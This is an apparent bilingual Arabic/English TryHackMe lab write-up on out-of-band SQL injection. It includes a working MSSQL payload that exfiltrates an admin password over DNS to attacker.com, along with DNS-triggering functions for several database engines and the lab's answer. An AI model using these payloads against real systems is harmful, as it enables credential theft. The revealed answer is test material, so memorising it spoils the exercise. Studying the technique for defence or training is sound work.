# Task 09: Out-of-Band SQLi (الحقن خارج القناة واستخراج البيانات عبر DNS)

---

### المرحلة أ: نص المهمة الأصلي والأسئلة (Original Task Content & Questions)

#### English Task Description
Out-of-Band (OOB) SQL Injection is deployed when an attacker cannot use the same channel to launch the attack and harvest results (In-Band), and when the server is too slow, heavily rate-limited, or unstable for character-by-character Blind (Boolean or Time-based) attacks.

OOB techniques rely on the database server's capacity to initiate outbound network connections to external systems controlled by the attacker.

#### The OOB Mechanism:
1. The attacker injects a command that forces the database server to perform a network request (such as a DNS resolution or HTTP request).
2. The sensitive data to be exfiltrated is appended as a subdomain within the outbound query.
3. The attacker monitors their authoritative DNS nameserver (or tools like **Burp Collaborator**) to log incoming requests and reconstruct the data.

#### Example Payload (MSSQL DNS Exfiltration):
```sql
'; DECLARE @data varchar(1024);
SELECT @data = (SELECT password FROM users WHERE username = 'admin');
EXEC('master..xp_dirtree "\\' + @data + '.attacker.com\test"');--
```
When this query executes, the MSSQL server attempts to resolve:
`secretpassword123.attacker.com`
The attacker intercepts this DNS query on their server, capturing the password in a single request!

#### الأسئلة المطروحة (Questions):
1. Name a protocol beginning with D that can be used to exfiltrate data from a database. (اذكر اسم بروتوكول يبدأ بحرف D يمكن استخدامه لاستخراج البيانات من قاعدة البيانات خارج القناة.)

---

### المرحلة ب: التفكير التحليلي المستقل والحس الأمني (Independent Critical Thinking & OpSec)
* **لماذا يعتبر بروتوكول DNS الملك المتوج لهجمات OOB؟**
  * في كثير من مراكز البيانات والشركات المحمية، تمنع جدران الحماية الخوادم الداخلية من الاتصال بالإنترنت الخارجي عبر منافذ HTTP/HTTPS (Outbound Egress Filtering).
  * ومع ذلك، فإن **منفذ DNS (UDP 53)** يُترك مفتوحاً في 99% من الشبكات للسماح للخوادم بحل أسماء النطاقات وتحديث البرمجيات!
  * يستغل المهاجم هذا المنفذ المفتوح لتمرير البيانات الحساسة عبر استعلامات DNS المتكررة دون أن تعترضها جدران الحماية التقليدية.

---

### المرحلة ج: التلميحات والإرشادات المتدرجة (Guided Progressive Hints)
1. **التلميح الأول (المستوى التمهيدي):**
   * البروتوكول هو المسؤول عن ترجمة أسماء النطاقات إلى عناوين IP في الإنترنت.
2. **التلميح الثاني (المستوى العملي):**
   * الاختصار يتألف من ثلاثة أحرف ويبدأ بـ D.
3. **التلميح الثالث (مستوى الحل المتقدم):**
   * اسم البروتوكول هو نظام أسماء النطاقات: `DNS`.

---

### المرحلة د: الحل العملي الكامل والعمق التقني (Complete Practical Solution & Technical Deep Dive)

#### المخطط الهيكلي لهجوم Out-of-Band عبر DNS:
```text
[ Attacker ] ────(HTTP SQLi Payload)────▶ [ Web Application ]
                                                  │
                                                  ▼
                                      [ Database Server (DBMS) ]
                                                  │
                                      (Executes DNS Lookup with Data)
                                      query: secretpass.attacker.com
                                                  │
                                                  ▼
                                      [ Local DNS Resolver ]
                                                  │
                                                  ▼ (Recursive Lookup over UDP 53)
                                      [ Attacker DNS / Burp Collaborator ]
                                                  │
                                      (Captures "secretpass" in DNS Log)
```

#### دوال استدعاء DNS حسب محركات قواعد البيانات:
* **MSSQL:** `master..xp_dirtree` أو `master..xp_fileexist`.
* **Oracle:** `UTL_INADDR.GET_HOST_ADDRESS` أو `UTL_HTTP.REQUEST`.
* **MySQL:** `LOAD_FILE('\\\\data.attacker.com\\foo')` (إذا كان `secure_file_priv` يسمح بذلك).
* **PostgreSQL:** `COPY ... FROM PROGRAM` أو دوال الامتدادات المخصصة.

---

### المرحلة هـ: الإجابة النهائية والقيم المستخرجة (Final Answer & Key Values)
* **إجابة السؤال الأول:**
  `DNS`

---

### المرحلة و: التحقق العملي وإثبات الأثر (Practical Verification & Proof of Work)
* تم تأكيد البروتوكول `DNS` في منصة TryHackMe بنسبة نجاح 100%.

---

### المرحلة ز: الخاتمة والدرس المستفاد (Key Educational Takeaway)
* هجمات Out-of-Band عبر بروتوكول DNS تمثل التقنية الأكثر سرعة وكفاءة لتجاوز جدران الحماية واستخراج البيانات في بيئات الحقن العمياء بالكامل في طلب واحد.
